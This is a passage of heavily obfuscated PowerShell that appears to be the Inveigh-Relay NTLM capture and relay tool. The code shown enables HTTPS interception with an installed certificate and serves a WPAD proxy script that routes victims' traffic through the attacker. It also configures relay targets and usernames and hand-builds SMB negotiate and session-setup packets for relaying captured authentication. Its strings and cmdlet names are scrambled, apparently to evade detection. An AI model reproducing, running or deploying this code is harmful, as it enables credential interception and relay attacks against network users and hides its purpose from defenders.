			    ${cER`TI`Fic`A`T`e_e`NrOlLmENt}.("{1}{4}{2}{3}{0}{5}" -f'romRe','Initial','e','F','iz','quest').Invoke(${cE`Rt`Ifi`cATe})
			    ${CErT`i`FIc`A`Te_d`AtA} = ${cert`iFic`At`e_E`NroL`LMeNT}.("{0}{1}{2}" -f'C','re','ateRequest').Invoke(0)
                ${ce`RtI`Fi`catE_`eNR`oLlmenT}.("{1}{3}{0}{4}{2}" -f'Resp','Insta','nse','ll','o').Invoke(2,${cerTI`FIc`Ate_`DATa},0,"")
                ${i`NveI`gH}."CeRt`I`FI`cAtE" = (&("{2}{1}{0}{3}"-f'hildIte','C','Get-','m') ((("{0}{2}{3}{4}{6}{5}{1}" -f'Cert:','My','{0}Local','Mach','ine{','}','0'))  -f  [cHar]92) | &("{1}{3}{2}{0}"-f't','Where','Objec','-') {${_}."iSsU`er" -match ${iNv`e`IGH}."c`eR`Tifi`caT`e_isSUeR"})
                ${Inv`eigH}."H`TtPs" = ${Tr`Ue}
                ${iN`V`eiGh}."st`AtUs`_`quEUE".("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{0}{4}{5}{2}"-f' Captu','HTT','bled','PS','re/Relay = ','Ena'))  > ${N`ULL}
            }
            else
            {

                if(${hTtPSfOrc`e`CErtd`eLe`Te} -eq 'Y')
                {
                    ${I`NVe`IGH}."HTT`ps_`ForCe_CeR`TiFicAt`E_DE`lETe" = ${t`RUe}
                }

                ${i`NVe`Igh}."hTtpS_ex`I`StINg_ce`RTi`FIcAte" = ${T`RUe}
                ${iNvE`IgH}."STA`T`US`_QUeue".("{0}{1}"-f'Ad','d').Invoke(("{5}{0}{10}{12}{9}{6}{7}{4}{2}{8}{1}{3}{11}"-f'TP','fic','ng','at','i','HT',' =',' Us',' Existing Certi','ure','S Cap','e','t'))  > ${Nu`ll}
            }

        }
        catch
        {
            ${htT`ps} = "N"
            ${I`N`VEIGH}."hT`TpS" = ${F`ALSE}
            ${INVE`I`gH}."s`T`A`TUs_QUeuE".("{1}{0}" -f 'dd','A').Invoke(("{8}{10}{5}{4}{9}{7}{2}{0}{6}{3}{1}"-f'cat','r','fi',' Erro','d D','y Disable','e',' To Certi','HTTPS Capture/Re','ue','la'))  > ${nU`LL}
        }

    }

}
else
{
    ${i`NVeI`Gh}."S`TATu`S`_qUeUe".("{0}{1}" -f 'Ad','d').Invoke(("{5}{2}{3}{1}{4}{0}"-f 'bled','Relay =','TPS Capt','ure/',' Disa','HT'))  > ${N`ULL}
}

if(${H`TtP} -eq 'Y' -or ${h`TTpS} -eq 'Y')
{

    if(${cH`A`LLenGe})
    {
        ${InVe`i`gh}."sTA`T`US_qUe`Ue".("{0}{1}"-f 'A','dd').Invoke(('NTLM'+' '+'Ch'+'all'+'enge '+'= '+"$Challenge"))  > ${n`Ull}
    }

    if(${m`AchiNEacCo`U`NTs} -eq 'N')
    {
        ${inVEi`gH}."StATUs_q`U`eUE".("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{4}{9}{6}{8}{7}{0}{5}{2}{10}" -f ' Disa','Machine A','l','cc','ou','b',' Cap','ure =','t','nt','ed')) > ${NU`Ll}
        ${iNv`eI`gh}."m`ACh`inE_A`ccOUntS" = ${f`AlsE}
    }
    else
    {
        ${i`NV`EIGH}."M`A`ChinE_a`ccOuntS" = ${T`RUE}
    }

    ${In`Ve`IgH}."STat`Us_q`UeuE".("{0}{1}"-f 'Ad','d').Invoke(('WP'+'AD '+'Aut'+'he'+'nt'+'ication '+'= '+"$WPADAuth")) > ${nU`Ll}

    if(${wpA`daU`Th} -eq ("{0}{1}" -f 'NTL','M'))
    {
        ${w`pa`DaUT`hIGN`ORE} = (${w`pAD`A`UT`HIgnore} | &("{3}{0}{2}{1}"-f'e-','ect','Obj','Wher') {${_} -and ${_}.("{1}{0}" -f'im','Tr').Invoke()})

        if(${WP`A`DautHIgno`Re}."cO`Unt" -gt 0)
        {
            ${iNvE`I`Gh}."st`A`TUS_qUeue".("{0}{1}" -f'A','dd').Invoke(("{7}{1}{6}{2}{5}{8}{0}{4}{3}"-f' ',' N','tication Ignor',' ','=','e Li','TLM Authen','WPAD','st') + (${wpA`DaUTh`igNOrE} -join ","))  > ${NU`lL}
        }

    }

    ${hTT`pRESe`TD`ELaY} = (${hTTp`RESe`TD`E`lAY} | &("{1}{2}{0}" -f 'bject','Where-','O') {${_} -and ${_}.("{1}{0}" -f'im','Tr').Invoke()})

    if(${Ht`TPRese`T`dEL`Ay}."CO`UNT" -gt 0)
    {
        ${InvE`i`gH}."sTA`TUs_`queUe".("{1}{0}" -f'dd','A').Invoke(("{5}{0}{2}{3}{1}{4}" -f'TTP','is',' Reset Delay ','L','t = ','H') + (${Htt`p`ResetDElaY} -join ","))  > ${Nu`ll}
        ${i`NvE`Igh}."sTATUs_Q`U`eue".("{1}{0}"-f'dd','A').Invoke(('HT'+'TP '+'Re'+'set '+'De'+'lay'+' '+'Time'+'out '+'= '+"$HTTPResetDelayTimeout "+'Seco'+'nds')) > ${n`ULl}
    }

}

if(${pRO`xY} -eq 'Y')
{

    if(${PROxy_`PO`RT`_`CheCk})
    {
        ${h`TtP} = "N"
        ${in`V`eIgH}."staT`U`s_qu`Eue".("{1}{0}" -f 'd','Ad').Invoke(('Prox'+'y '+'Capture/'+'Rela'+'y'+' '+'Di'+'sable'+'d '+'D'+'ue '+'T'+'o '+'I'+'n '+'Use'+' '+'Port'+' '+"$ProxyPort"))  > ${N`UlL}
    }
    else
    {
        ${I`NV`EIgH}."sTatU`S_qu`E`UE".("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{1}{0}{5}{4}"-f' ','ure/Relay =','Prox','y Capt','nabled','E'))  > ${nu`LL}
        ${inve`IgH}."STATUS`_q`U`eue".("{1}{0}" -f 'd','Ad').Invoke(('P'+'ro'+'xy '+'P'+'ort '+'= '+"$ProxyPort")) > ${n`ULL}
        ${PRO`xyPO`RTfa`I`LOV`er} = ${P`RO`xyPorT} + 1
        ${WPadrES`Po`NSe} = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
        ${PrOx`Yig`N`Ore} = (${pR`oXyIgN`orE} | &("{2}{0}{1}{3}" -f 're-Obj','ec','Whe','t') {${_} -and ${_}.("{0}{1}"-f 'T','rim').Invoke()})

        if(${pro`X`yig`NoRe}."cou`NT" -gt 0)
        {
            ${In`Ve`IGH}."S`TaTuS`_QUeue".("{1}{0}" -f'dd','A').Invoke(("{4}{5}{0}{3}{1}{2}"-f'gnor','st =',' ','e Li','Pr','oxy I') + (${pr`ox`Y`iGNoRe} -join ","))  > ${n`ULl}
        }

    }

}

${iNVe`i`GH}."S`Tat`US_Qu`euE".("{0}{1}" -f 'Ad','d').Invoke(('Rel'+'ay '+'Ta'+'rg'+'et '+'= '+"$Target")) > ${n`Ull}

if(${Us`ERNaM`eS})
{

    if(${Us`ErnA`MEs}."cO`UnT" -eq 1)
    {
        ${I`Nvei`gH}."St`ATUS_QU`euE".("{1}{0}" -f'd','Ad').Invoke(("{4}{2}{1}{5}{3}{0}" -f ' ','y','la','=','Re',' Username ') + (${UsER`Nam`es} -join ",")) > ${nU`ll}
    }
    else
    {
        ${i`NVEi`gh}."S`TATus_`Qu`EUE".("{1}{0}"-f'dd','A').Invoke(("{1}{3}{5}{4}{2}{0}"-f' ','R','mes =','elay','serna',' U') + (${useR`N`Ames} -join ",")) > ${N`ULL}
    }

}

if(${rElAYa`U`T`ODI`sAbLe} -eq 'Y')
{
    ${In`VEigh}."sT`Atus`_QUeUE".("{1}{0}" -f'd','Ad').Invoke(("{5}{3}{0}{1}{6}{4}{8}{2}{7}"-f 't','o','l','y Au','s','Rela',' Di','e = Enabled','ab')) > ${n`ULl}
}
else
{
    ${i`NV`eIGh}."sT`ATU`S_que`UE".("{1}{0}"-f 'd','Ad').Invoke(("{3}{4}{0}{2}{6}{1}{5}"-f'o Disable ','b','= Dis','Relay A','ut','led','a')) > ${nU`ll}
}

if(${rEL`AYAu`T`oexIt} -eq 'Y')
{
    ${In`Ve`igh}."s`TAt`Us_qUeUe".("{0}{1}"-f'Ad','d').Invoke(("{3}{4}{0}{2}{5}{1}"-f'x','= Enabled','it','Relay Au','to E',' ')) > ${N`UlL}
}
else
{
    ${InV`eiGh}."sTAT`US_`Q`UeuE".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{5}{2}{4}{3}" -f 'e','R','o','t = Disabled',' Exi','lay Aut')) > ${N`UlL}
}

if(${s`eR`VicE})
{
    ${inV`e`IgH}."ST`ATUS_`Qu`eUe".("{1}{0}" -f 'd','Ad').Invoke(('Relay'+' '+'Service'+' '+'= '+"$Service")) > ${N`ULL}
}

if(${s`mB1})
{
    ${iNvE`I`GH}."sT`A`TUs_Que`UE".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{3}{1}{4}" -f'B Ve','= SMB','SM','rsion ','1')) > ${N`ULL}
    ${sM`B_`VerSIOn} = ("{0}{1}" -f'S','MB1')
}

if(${C`O`Ns`oLEOuTp`UT} -ne 'N')
{
    
    if(${COnS`ol`Eoutput} -eq 'Y')
    {
        ${inV`E`igh}."St`At`Us_quEuE".("{0}{1}"-f'A','dd').Invoke(("{1}{4}{3}{5}{0}{7}{2}{6}{8}" -f 'O','Rea','put ',' ','l','Time Console ','= En','ut','abled'))  > ${n`Ull}
    }
    else
    {
        ${in`VE`Igh}."StA`TUs_`qU`EUe".("{1}{0}" -f'd','Ad').Invoke(('Real'+' '+'Time'+' '+'Co'+'nsol'+'e '+'Out'+'put '+'= '+"$ConsoleOutput"))  > ${Nu`lL}
    }

    ${i`NvEI`GH}."COnS`OLe`_ou`TpuT" = ${tr`UE}

    if(${c`On`soLeSTat`Us} -eq 1)
    {
        ${iN`V`EIgH}."Sta`Tu`S_qUe`UE".("{0}{1}" -f'A','dd').Invoke(('Console'+' '+'Sta'+'t'+'us '+'= '+"$ConsoleStatus "+'Min'+'ute'))  > ${Nu`ll}
    }
    elseif(${Co`Nso`lEStAt`US} -gt 1)
    {
        ${i`NV`EIgh}."stATUs`_q`U`eUe".("{0}{1}"-f'A','dd').Invoke(('Console'+' '+'St'+'atus '+'= '+"$ConsoleStatus "+'Mi'+'nu'+'tes'))  > ${Nu`lL}
    }

}
else
{

    if(${i`Nve`IGH}."t`OOl" -eq 1)
    {
        ${In`VeI`Gh}."StaTUs`_Qu`EUE".("{1}{0}"-f 'dd','A').Invoke(("{14}{19}{8}{16}{2}{0}{1}{17}{10}{18}{11}{3}{7}{12}{6}{4}{9}{13}{15}{5}" -f 'l','e ','so','d Due ','rn','election','xte','To ','m','a','tput ','le','E','l ','Real','Tool S','e Con','Ou','Disab',' Ti')) > ${NU`Ll}
    }
    else
    {
        ${IN`V`EIGh}."Sta`TUs`_qU`eUe".("{0}{1}" -f'Ad','d').Invoke(("{3}{6}{2}{0}{5}{1}{4}"-f'onso','tput = D','ime C','Real ','isabled','le Ou','T')) > ${Nu`Ll}
    }

}

if(${CoNso`L`EuNi`QUE} -eq 'Y')
{
    ${INVe`i`gH}."c`oNSOle_uNi`q`Ue" = ${TR`UE}
}
else
{
    ${I`NvEI`gh}."co`NsoL`E_uNi`q`UE" = ${fa`Lse}
}

if(${FIl`EouTP`Ut} -eq 'Y')
{
    ${iNvei`Gh}."StAtU`s_`qu`eUE".("{1}{0}" -f 'd','Ad').Invoke(("{3}{0}{2}{4}{5}{1}" -f 'F','t = Enabled','i','Real Time ','le Outp','u')) > ${NU`ll}
    ${i`NvEi`GH}."sTaTu`s_q`UeUe".("{1}{0}"-f'd','Ad').Invoke(('Outp'+'u'+'t '+'Di'+'recto'+'ry '+'= '+"$output_directory")) > ${nU`ll}
    ${i`N`VEIgH}."FILe_oU`Tp`UT" = ${tr`Ue}
}
else
{
    ${i`Nv`eIGh}."ST`ATus_Q`U`eUE".("{0}{1}" -f 'Ad','d').Invoke(("{3}{0}{1}{6}{7}{5}{4}{2}"-f'al',' T',' Disabled','Re','t =','u','ime File Out','p')) > ${nu`ll}
}

if(${ru`NtI`Me} -eq 1)
{
    ${i`Nv`eiGH}."s`T`AtUs_Queue".("{1}{0}" -f 'd','Ad').Invoke(('Ru'+'n '+'Tim'+'e '+'= '+"$RunTime "+'Minut'+'e')) > ${nU`lL}
}
elseif(${r`Unt`ImE} -gt 1)
{
    ${i`NvEIgh}."S`TAtuS_`qU`eue".("{1}{0}"-f'dd','A').Invoke(('Ru'+'n '+'Tim'+'e '+'= '+"$RunTime "+'Minu'+'tes')) > ${nu`Ll}
}

if(${s`hoWhE`Lp} -eq 'Y')
{
    ${I`NVEi`gH}."St`AT`US_QuEUe".("{1}{0}" -f'dd','A').Invoke(("{3}{0}{4}{1}{8}{7}{5}{2}{6}"-f 'un','top-Inveig','v','R',' S',' In','eigh-Relay','top','h to s')) > ${N`Ull}
        
    if(${i`NveI`Gh}."co`N`sOLe`_OU`TPuT")
    {
        ${iN`V`eIgh}."staTUS_q`U`EUe".("{1}{0}"-f'dd','A').Invoke(("{8}{13}{0}{11}{5}{4}{3}{10}{9}{12}{6}{2}{7}{1}"-f'ss an','utput',' ','s',' ','o','sole','o','Pr','t','top real ','y key t','ime con','e')) > ${n`UlL}
    }

}

if(${iNV`E`IgH}."STAtUS`_o`UTPUT")
{

    while(${i`N`VeIgh}."stATu`S`_qUE`UE"."Cou`Nt" -gt 0)
    {

        switch -Wildcard (${In`V`eIGh}."Status`_`qU`Eue"[0])
        {

            {${_} -like ("{3}{2}{4}{1}{0}" -f'Due To *',' ','b','* Disa','led') -or ${_} -like ("{0}{2}{7}{8}{6}{5}{1}{3}{4}"-f 'Run Sto','ig','p-Inve','h-','Relay',' Inve','p','igh to st','o') -or ${_} -like ("{3}{5}{6}{2}{1}{0}{4}"-f'= Enab','all ','irew','W','led','indow','s F')}
            {

                if(${i`NV`eigH}."ou`TpUt_`ST`ReAm_onLy")
                {
                    &("{2}{1}{0}{3}"-f'ite-Outp','r','W','ut')(${INV`E`iGH}."sTA`TUs_q`UEuE"[0] + ${InV`EIgh}."nEWL`Ine")
                }
                else
                {
                    &("{0}{2}{1}" -f 'Wr','arning','ite-W')(${iNVe`i`gH}."sT`At`Us`_QUeuE"[0])
                }

                ${i`N`VeiGh}."sTA`TuS`_qUeUE".("{0}{2}{1}" -f 'R','oveAt','em').Invoke(0)
            }

            ("{1}{2}{0}" -f 't','de','faul')
            {

                if(${iNVei`GH}."OUT`PuT_stRea`M`_`only")
                {
                    &("{0}{2}{1}"-f 'Wr','e-Output','it')(${I`NvE`IGh}."staTUS_`Q`UE`UE"[0] + ${i`NvE`iGh}."ne`W`LinE")
                }
                else
                {
                    &("{2}{1}{0}"-f 't','te-Outpu','Wri')(${I`N`VEiGH}."sTA`T`U`s_qUEuE"[0])
                }

                ${INV`eIGH}."sta`TuS`_`QuEUe".("{0}{1}{2}"-f 'R','emove','At').Invoke(0)
            }

        }

    }

}

${PRO`ceSS_`ID} =  (&("{0}{1}" -f 'iTE','M') varIABle:Ul3 )."Va`Lue"::("{1}{2}{0}{3}"-f 'en','GetCur','r','tProcess').Invoke() | &("{0}{3}{1}{2}" -f'S','-O','bject','elect') -expand ('id')
${prOC`ess_`iD} =   (  &("{2}{0}{1}{3}"-f 'T-va','RIabl','Ge','E') ('W2'+'EHx') -VaL )::("{2}{1}{0}" -f'ring','oSt','T').Invoke(  ( &("{0}{1}"-f'G','cI') ('v'+'ari'+'Able:W2eHX')  )."VAL`Ue"::("{1}{0}{2}" -f 'e','G','tBytes').Invoke(${pRO`ce`s`s_ID}))
${procEs`s`_`id} = ${PR`OCE`sS_id} -replace ("{1}{0}" -f'00','-00-'),""
[Byte[]]${IN`VEI`Gh}."p`ROcEsS_Id_B`Y`TES" = ${p`Ro`ceSs_Id}.("{0}{1}" -f'Sp','lit').Invoke("-") | &("{0}{1}{2}" -f'ForEa','c','h-Object'){[Char]  ( &("{1}{0}" -f 'IABLe','vAr')  kPA -VA)::("{0}{1}{2}" -f'To','In','t16').Invoke(${_},16)}




${Sh`ArEd_B`AsIC_`F`Unction`s_scRiPTB`L`ock} =
{

    function dAtA`leng`Th2
    {
        param ([Int]${LengT`h_Sta`RT},[Byte[]]${st`RING`_eXtR`A`CT_DaTA})

        ${StRin`g_L`eN`Gth} =  (&("{0}{1}"-f 'VAR','IabLE')  w2eHX  -vaLUe )::"tOuIn`T`16"(${St`R`inG_eXTRa`Ct_`DatA}[${l`eNgTH_StA`RT}..(${LE`NGt`H_STart} + 1)],0)
        return ${sTRI`N`G`_L`ENgtH}
    }

    function DAt`AL`ENgT`H4
    {
        param ([Int]${l`e`NgtH_S`TarT},[Byte[]]${S`Tri`N`g_ex`TRAcT_da`TA})

        ${str`ING`_L`enG`TH} =  ( &("{1}{0}" -f 'R','Di')  vARiable:W2eHx)."vA`LuE"::"tOuiN`T`32"(${StR`ING`_`E`XtRaC`T_`DatA}[${lEN`gt`H`_STArT}..(${leNgt`H_Sta`Rt} + 3)],0)
        return ${STR`iN`G`_Len`gTH}
    }

    function DAtAT`o`stRING
    {
        param ([Int]${sT`R`I`NG_StArT},[Int]${S`TR`iNg_l`ENgtH},[Byte[]]${ST`RIng`_E`XtrAC`T_`daTA})

        ${Str`iNg`_`DATA} =   ( &("{0}{1}" -f'IT','Em')  ("vARIa"+"BL"+"e:"+"w2E"+"Hx")  )."vA`Lue"::"To`st`RInG"(${StRI`Ng_eX`T`RAC`T`_Da`TA}[${S`T`R`ing_stA`RT}..(${StR`INg_sT`A`Rt} + ${StrIN`G_Le`N`GTH} - 1)])
        ${StRINg`_da`TA} = ${sTRI`NG_`dAta} -replace "-00",""
        ${S`TRiNG_`d`ATa} = ${S`T`RIng`_dAtA}.("{0}{1}"-f 'Sp','lit').Invoke("-") | &("{1}{0}{2}" -f 'bj','ForEach-O','ect'){[Char]  ${K`pA}::("{0}{1}" -f 'To','Int16').Invoke(${_},16)}
        ${ST`RiN`g_Ext`RA`ct} = &("{2}{0}{1}"-f '-O','bject','New') ("{0}{2}{1}" -f'System.St','g','rin') (${StRI`N`G_`dAtA},0,${STR`IN`g_`dAtA}."leng`TH")
        return ${StRIng`_eX`T`R`ACT}
    }

}


${I`RK`in_Fu`NctIONs_SCri`PT`Bl`o`cK} =
{
    function c`oNvEr`T`F`R`om-PAc`KeT`oRDEr`EdD`IcTIOnary
    {
        param(${p`ACkE`T`_O`RDerE`D_DIcti`ONaRy})

        ForEach(${F`Ie`Ld} in ${PAck`et_oRd`ERE`D_d`i`CTiOnaRY}."v`ALUes")
        {
            ${B`Yte_a`RR`AY} += ${FiE`lD}
        }

        return ${BYTE`_a`R`Ray}
    }

    

    function GEt`-`pa`ck`eTneTbIoSseS`siOnsErvi`CE()
    {
        param([Int]${PaC`kET_`H`eaDE`R`_lengTH},[Int]${pACk`Et_d`AT`A_`lE`NgTH})

        [Byte[]]${paC`KET_NET`Bi`oS_SeSsiON`_s`eRVic`E_L`e`N`gth} =  (  &("{1}{0}" -f 'R','Di')  ("V"+"aRi"+"ABle"+":W2EH"+"X"))."V`ALue"::("{1}{0}{2}"-f 'yte','GetB','s').Invoke(${P`ACkE`T_`HE`AdE`R_lENg`Th} + ${pacKEt_DaT`A_LE`NG`TH})
        ${pACK`E`T_nETb`io`s_S`E`SsiON_SERvice_`lEngth} = ${P`AcKet`_NE`TBios_Sess`ion_se`Rv`i`Ce_L`En`GTh}[2..0]

        ${packEt_NETB`Io`s`se`sSIonSEr`VIcE} = &("{1}{2}{0}"-f'-Object','Ne','w') ("{7}{1}{12}{5}{6}{2}{10}{0}{3}{11}{4}{8}{9}"-f 'p','st','ctions.','ecialized.','re','.Col','le','Sy','dDictio','nary','S','Orde','em')
        ${P`ACket_`NET`Bi`ossEssi`ONseRVIce}.("{1}{0}"-f'd','Ad').Invoke(("{5}{6}{7}{0}{3}{4}{1}{2}"-f'SessionServic','p','e','e_','Message_Ty','Net','BIO','S'),[Byte[]](0x00))
        ${paCke`T_`NEtbioSs`esSi`ON`seRVicE}.("{1}{0}" -f 'dd','A').Invoke(("{6}{5}{2}{4}{0}{1}{3}" -f'e','ng','Se','th','rvice_L','tBIOSSession','Ne'),[Byte[]](${p`AckET_netBI`oS_se`SsIo`N_SERV`iCe_`LEN`gth}))

        return ${PACKeT`_NETbI`Os`s`e`SsiON`Se`Rv`Ice}
    }

    

    function geT-PACkeTSm`B`hEAD`er()
    {
        param([Byte[]]${P`Ac`KeT_`comMA`Nd},[Byte[]]${PACK`E`T_`FlAgs},[Byte[]]${PACKEt_fL`A`gS2},[Byte[]]${pAcK`Et_`T`Ree`_ID},[Byte[]]${p`AcK`ET_Pr`oC`esS_ID},[Byte[]]${PaCkET`_USer`_Id})

        ${PAc`k`et_`SmBHeaDeR} = &("{0}{2}{1}{3}" -f 'Ne','-','w','Object') ("{6}{1}{8}{9}{7}{11}{0}{3}{10}{12}{4}{2}{5}" -f'e','y','O','ctions.Spe','.','rderedDictionary','S','m.Col','st','e','cia','l','lized')
        ${p`ACKET`_sMb`HeA`der}.("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{3}{0}"-f 'tocol','SMBHe','ader_','Pro'),[Byte[]](0xff,0x53,0x4d,0x42))
        ${P`Acke`T_sMBH`eA`D`ER}.("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{4}{5}{3}{1}" -f'MBHeader_','nd','S','mma','C','o'),${P`AcKe`T_co`mmand})
        ${pA`C`kET`_SM`BhE`ADeR}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}{3}" -f'er','BHead','SM','_ErrorClass'),[Byte[]](0x00))
        ${PACk`et_`smBhea`dEr}.("{0}{1}"-f'A','dd').Invoke(("{4}{0}{5}{3}{1}{2}" -f'ader','rve','d','Rese','SMBHe','_'),[Byte[]](0x00))
        ${pAcke`T_`SMBheA`DER}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{4}{1}{3}" -f 'SMBH','d','eader_ErrorC','e','o'),[Byte[]](0x00,0x00))
        ${paC`ket`_sMbHeA`DER}.("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}"-f 'der_Flag','s','SMBHea'),${p`A`cKe`T_fLaGs})
        ${PaCk`Et_smB`HEA`DEr}.("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}" -f'der_Flags2','SMBHe','a'),${pacK`Et_f`L`AG`s2})
        ${P`Ack`E`T_SMBHe`AdeR}.("{0}{1}" -f'A','dd').Invoke(("{1}{4}{6}{5}{2}{3}{0}" -f 'IDHigh','SMBH','roc','ess','e','der_P','a'),[Byte[]](0x00,0x00))
        ${Pa`c`Ket_SmBheA`dEr}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{2}{0}{3}"-f'er_Signat','SM','ad','ure','BHe'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${PaC`kE`T_Sm`B`HEa`der}.("{1}{0}" -f'dd','A').Invoke(("{0}{4}{3}{1}{2}"-f'S','r_Re','served2','e','MBHead'),[Byte[]](0x00,0x00))
        ${PA`c`K`et_sm`BhEader}.("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{2}{1}" -f'SMBHeade','reeID','_T','r'),${p`AcKet_`TR`EE_`id})
        ${P`AcK`Et_SMbH`eaD`Er}.("{1}{0}" -f 'dd','A').Invoke(("{3}{0}{5}{4}{1}{2}" -f'Hea','r','ocessID','SMB','r_P','de'),${PACk`e`T_pRoce`Ss_ID})
        ${PaC`KE`T_SM`BHead`er}.("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}"-f 'SMBHeader','_UserI','D'),${Pac`ket_uS`ER_`iD})
        ${PA`Ck`eT_SM`BHeADer}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}{3}{4}{5}" -f 'S','ead','MBH','er','_MultiplexI','D'),[Byte[]](0x00,0x00))

        return ${paCkEt`_SmBH`Ead`Er}
    }

    function get-packe`TSmBNEGot`i`A`TePrOTOCOLr`e`QUEsT()
    {
        param([String]${pACKeT_vE`R`si`on})

        if(${p`A`ck`Et_vEr`sioN} -eq ("{1}{0}"-f'MB1','S'))
        {
            [Byte[]]${PA`C`KET`_`B`YTE_cOunt} = 0x0c,0x00
        }
        else
        {
            [Byte[]]${Pac`Ke`T_bYt`e_couNT} = 0x22,0x00  
        }

        ${PA`C`KET_Sm`B`NEGotI`ATep`RoTocOLR`EQuest} = &("{1}{2}{0}" -f 'ct','New-O','bje') ("{9}{0}{7}{5}{1}{6}{3}{4}{2}{8}" -f '.Coll','ecialize','a','.Orde','redDiction','ns.Sp','d','ectio','ry','System')
        ${PAC`kET_`s`MBNEGOti`At`EP`Ro`TocO`lREq`U`esT}.("{1}{0}" -f 'dd','A').Invoke(("{6}{5}{1}{4}{10}{9}{7}{3}{0}{2}{8}" -f'ou','rot','n','rdC','o','MBNegotiateP','S','quest_Wo','t','Re','col'),[Byte[]](0x00))
        ${pACKe`T_sMbn`eg`OTiAT`epRoT`O`CoL`REQUE`St}.("{1}{0}"-f'dd','A').Invoke(("{0}{3}{4}{7}{2}{5}{6}{1}" -f 'S','ount','o','MBNegotiat','e','to','colRequest_ByteC','Pr'),${P`ACkEt`_B`yte`_CouNT})
        ${pAckEt_sMbn`EGot`IaTe`pR`otOcO`lRequesT}.("{0}{1}" -f 'A','dd').Invoke(("{1}{12}{13}{6}{7}{11}{8}{15}{18}{9}{19}{0}{10}{17}{4}{5}{2}{16}{3}{14}" -f 'R','SMB','ts_Di','fferFo','i','alec','ot','i','Pro','quest','equested','ate','Ne','g','rmat','to','alect_Bu','D','colRe','_'),[Byte[]](0x02))
        ${p`AcK`Et_SMbneG`O`Ti`Atepro`TOC`OlrEQUeSt}.("{0}{1}" -f'A','dd').Invoke(("{2}{3}{11}{6}{10}{1}{9}{7}{12}{0}{4}{5}{8}" -f 'edDialec','qu','SMBNe','gotia','t','s_Diale','uest_R','s','ct_Name','e','e','teProtocolReq','t'),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if(${PaC`kEt_v`eRsi`On} -ne ("{1}{0}" -f'MB1','S'))
        {
            ${P`ACkeT_SMBNegOTIateP`R`OtO`CO`lR`EqUeSt}.("{0}{1}"-f'A','dd').Invoke(("{4}{3}{2}{14}{9}{13}{6}{15}{8}{10}{7}{12}{11}{0}{1}{5}"-f 'fferFo','rma','iat','got','SMBNe','t2','i','l','Di','ProtocolRequest_Req','a','Bu','ect_','uestedD','e','alects_'),[Byte[]](0x02))
            ${p`ACKe`T_sM`B`N`EGo`T`iAT`EprOtoCoLReQ`Uest}.("{1}{0}"-f'd','Ad').Invoke(("{10}{12}{3}{4}{2}{11}{5}{1}{7}{8}{6}{9}{0}"-f '2','Diale','R','ocolRequest','_','d','lect_','cts_D','ia','Name','SMBNego','equeste','tiateProt'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            ${packeT_sMbn`EgOt`iAte`PROTOcO`lR`Equ`esT}.("{1}{0}"-f'd','Ad').Invoke(("{5}{8}{2}{17}{15}{11}{12}{14}{7}{1}{3}{0}{4}{13}{16}{10}{6}{9}"-f 'stedDia','t_Req','teP','ue','l','SMBNegot','t_','s','ia','BufferFormat3','c','colReq','u','ects_Dial','e','to','e','ro'),[Byte[]](0x02))
            ${pacK`eT_Smbn`EG`Otia`TEPR`oT`OcO`lrEq`U`e`st}.("{0}{1}"-f 'A','dd').Invoke(("{3}{14}{12}{17}{8}{10}{11}{15}{6}{5}{7}{2}{4}{13}{16}{0}{1}{9}"-f'm','e','e','SM','dDial','Req','_','uest','to','3','col','Req','Negotiat','ects_Dialec','B','uest','t_Na','ePro'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return ${PAckeT`_`sMB`NEgoT`iate`PROtOCO`LREqUeSt}
    }

    function get-paC`K`etsmbs`ESsION`S`etUPa`NdxREquesT()
    {
        param([Byte[]]${packE`T_S`Ecu`Rity`_bL`Ob})

        [Byte[]]${packET_b`yTe_c`O`Unt} =   ( &("{2}{0}{3}{1}"-f 'aRIA','e','GEt-v','bL') w2eHx )."V`ALuE"::("{2}{0}{1}" -f 't','es','GetBy').Invoke(${pa`CKE`T_SECuRITY_B`LOb}."L`ength")
        ${P`AC`kET_BY`TE`_CounT} = ${pAcKe`T_bY`T`E_couNt}[0,1]
        [Byte[]]${paC`KeT`_SeC`UR`I`TY_BLob_`LengtH} =   ( &("{0}{1}{3}{2}" -f'gET','-v','Ble','ARiA') w2ehx  -vAL)::("{2}{0}{1}" -f 'etByte','s','G').Invoke(${pa`ck`et_secUrITY_b`l`Ob}."LE`NgTh" + 5)
        ${PAc`KeT_sE`C`U`R`itY_BloB`_leN`GTH} = ${pAckEt`_secU`RiTy_`B`Lo`B_L`ENGth}[0,1]

        ${pAcKeT_sMbseSsi`O`N`S`e`Tu`paNDxreQUe`St} = &("{0}{1}{2}"-f 'New-Obje','c','t') ("{0}{14}{4}{12}{9}{13}{11}{1}{10}{6}{5}{3}{2}{7}{8}" -f 'S','.S','ed.O','liz','m','a','i','rder','edDictionary','C','pec','ons','.','ollecti','yste')
        ${Pac`ket_`S`MB`S`essio`NseTupANdxreQuEST}.("{1}{0}"-f 'd','Ad').Invoke(("{6}{5}{0}{2}{1}{7}{3}{4}{8}"-f 'u','Wor','est_','u','n','essionSetupAndXReq','SMBS','dCo','t'),[Byte[]](0x0c))
